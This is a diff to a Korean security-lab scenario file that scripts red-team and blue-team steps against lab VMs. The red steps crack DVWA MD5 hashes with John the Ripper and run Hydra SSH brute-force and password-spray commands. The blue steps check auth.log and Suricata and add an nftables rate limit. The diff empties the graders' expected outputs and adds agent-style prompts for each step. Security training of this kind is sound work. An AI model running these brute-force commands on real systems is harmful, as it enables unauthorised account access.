@@ -29,11 +29,12 @@ steps:
   answer_detail: 같은 평문이라도 해시 알고리즘에 따라 완전히 다른 해시값이 생성된다. MD5는 32자, SHA1은 40자, SHA256은 64자의 16진수 문자열을 출력한다.
   verify:
     type: output_contains
-    expect: 482c811da5d5b4bc6d497ffa98491e38
+    expect: 
     field: stdout
   target_vm: attacker
   script: echo -n 'password123' | md5sum && echo -n 'password123' | sha1sum && echo -n 'password123' | sha256sum
   risk_level: low
+  bastion_prompt: '[RED] 다양한 해시 유형(MD5, SHA1, SHA256)의 샘플 해시를 생성해줘'
 - order: 2
   instruction: '[RED] Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비하라.'
   hint: user:hash 형식의 파일을 생성한다.
@@ -53,7 +54,7 @@ steps:
   answer_detail: John the Ripper는 user:hash 형식의 입력을 기대한다. DVWA의 패스워드 해시는 MD5(unsalted)로, 현대 기준으로는 매우 취약하다.
   verify:
     type: file_exists
-    expect: /tmp/dvwa_hashes.txt
+    expect: 
     field: filesystem
   target_vm: attacker
   script: 'cat > /tmp/dvwa_hashes.txt << ''EOF''
@@ -68,6 +69,7 @@ steps:
 
     EOF'
   risk_level: medium
+  bastion_prompt: '[RED] Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비해줘'
 - order: 3
   instruction: '[RED] John the Ripper의 기본 워드리스트로 해시 크래킹을 시도하라.'
   hint: john 명령에 --format=raw-md5 옵션을 지정한다.
@@ -77,11 +79,12 @@ steps:
   answer_detail: John the Ripper는 워드리스트의 각 단어를 해시하여 대상 해시와 비교한다. rockyou.txt는 1,400만개 이상의 실제 유출 패스워드를 포함한다.
   verify:
     type: output_contains
-    expect: Loaded
+    expect: 
     field: stdout
   target_vm: attacker
   script: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
   risk_level: medium
+  bastion_prompt: '[RED] John the Ripper의 기본 워드리스트로 해시 크래킹을 시도해줘'
 - order: 4
   instruction: '[RED] 크래킹 결과를 확인하라.'
   hint: john --show 옵션을 사용한다.
@@ -91,11 +94,12 @@ steps:
   answer_detail: --show 옵션은 이미 크래킹된 해시의 결과를 표시한다. password, abc123, letmein 등 약한 패스워드가 즉시 크래킹된다.
   verify:
     type: output_contains
-    expect: password
+    expect: ''
     field: stdout
   target_vm: attacker
   script: john --show --format=raw-md5 /tmp/dvwa_hashes.txt
   risk_level: medium
+  bastion_prompt: '[RED] 크래킹 결과를 확인해줘'
 - order: 5
   instruction: '[RED] Hydra를 사용하여 web 서버 SSH 서비스에 온라인 브루트포스를 수행하라.'
   hint: hydra -l user -P wordlist ssh://target 형식을 사용한다.
@@ -105,11 +109,12 @@ steps:
   answer_detail: Hydra는 온라인 패스워드 브루트포스 도구이다. -t 4는 동시 연결 수, -f는 첫 번째 성공 시 중지한다. SSH는 느리므로 스레드 수를 제한해야 한다.
   verify:
     type: output_contains
-    expect: 'host:'
+    expect: 
     field: stdout
   target_vm: attacker
   script: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80 -t 4 -f -w 5
   risk_level: medium
+  bastion_prompt: '[RED] Hydra를 사용하여 web 서버 SSH 서비스에 온라인 브루트포스를 수행해줘'
 - order: 6
   instruction: '[BLUE] auth.log에서 SSH 브루트포스 공격 흔적을 확인하라.'
   hint: grep으로 'Failed password'를 검색한다.
@@ -119,11 +124,12 @@ steps:
   answer_detail: auth.log의 'Failed password'는 SSH 로그인 실패를 나타낸다. 10.20.30.201에서 대량의 실패 기록이 있으면 브루트포스 공격 증거이다.
   verify:
     type: output_contains
-    expect: Failed
+    expect: 
     field: stdout
   target_vm: web
   script: grep 'Failed password' /var/log/auth.log | tail -20
   risk_level: low
+  bastion_prompt: '[BLUE] auth.log에서 SSH 브루트포스 공격 흔적을 확인해줘'
 - order: 7
   instruction: '[BLUE] SSH 로그인 실패를 IP별로 집계하여 공격 IP를 식별하라.'
   hint: awk와 sort를 조합한다.
@@ -133,11 +139,12 @@ steps:
   answer_detail: awk로 IP 필드를 추출하고 sort | uniq -c | sort -rn으로 빈도 내림차순 정렬한다. 10.20.30.201이 최상위 공격 IP로 나타나야 한다.
   verify:
     type: output_contains
-    expect: 10.20.30
+    expect: 
     field: stdout
   target_vm: web
   script: grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
   risk_level: low
+  bastion_prompt: '[BLUE] SSH 로그인 실패를 IP별로 집계하여 공격 IP를 식별해줘'
 - order: 8
   instruction: '[BLUE] Suricata에서 SSH 브루트포스 탐지 알림을 확인하라.'
   hint: eve.json에서 SSH 관련 알림을 검색한다.
@@ -148,12 +155,13 @@ steps:
   answer_detail: Suricata는 SSH 연결 빈도를 기반으로 브루트포스를 탐지한다. threshold 설정에 따라 일정 횟수 이상의 시도가 감지되면 알림이 발생한다.
   verify:
     type: output_contains
-    expect: 10.20.30
+    expect: 
     field: stdout
   target_vm: secu
   script: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert" and (.alert.signature | test("SSH|brute"; "i"))) | "\(.timestamp) \(.alert.signature)"' 2>/dev/null | tail -5 || grep
     -i ssh /var/log/suricata/fast.log | tail -5
   risk_level: low
+  bastion_prompt: '[BLUE] Suricata에서 SSH 브루트포스 탐지 알림을 확인해줘'
 - order: 9
   instruction: '[BLUE] 공격자 IP(10.20.30.201)의 SSH 접근을 nftables로 rate limiting하라.'
   hint: nft add rule로 SSH 접근 빈도를 제한한다.
@@ -163,12 +171,13 @@ steps:
   answer_detail: SSH 브루트포스 방어는 새로운 연결(ct state new)의 빈도를 제한하는 것이다. 분당 3회 초과 시 차단하면 사전 공격의 효율을 크게 떨어뜨린다.
   verify:
     type: output_contains
-    expect: 10.20.30.201
+    expect: ''
     field: stdout
   target_vm: secu
   requires_approval: true
   script: sudo nft add rule inet filter input ip saddr 10.20.30.201 tcp dport 22 ct state new limit rate over 3/minute drop && nft list ruleset | grep '10.20.30.201'
   risk_level: low
+  bastion_prompt: '[BLUE] 공격자 IP(10.20.30.201)의 SSH 접근을 nftables로 rate limiting해줘'
 - order: 10
   instruction: '[RED] 패스워드 스프레이 공격을 시뮬레이션하라. 여러 사용자에 대해 하나의 패스워드를 시도한다.'
   hint: hydra -L userlist -p password 형식을 사용한다.
@@ -178,8 +187,9 @@ steps:
   answer_detail: 패스워드 스프레이는 하나의 패스워드를 여러 계정에 시도하는 기법이다. 계정 잠금을 우회하기 위해 사용되며, -L은 사용자 목록 파일이다.
   verify:
     type: output_contains
-    expect: 'host:'
+    expect: 
     field: stdout
   target_vm: attacker
   script: echo -e 'root\nccc\nadmin\nwww-data\nservice' > /tmp/users.txt && hydra -L /tmp/users.txt -p ccc ssh://10.20.30.80 -t 4 -f -w 5
   risk_level: medium
+  bastion_prompt: '[RED] 패스워드 스프레이 공격을 시뮬레이션해줘'
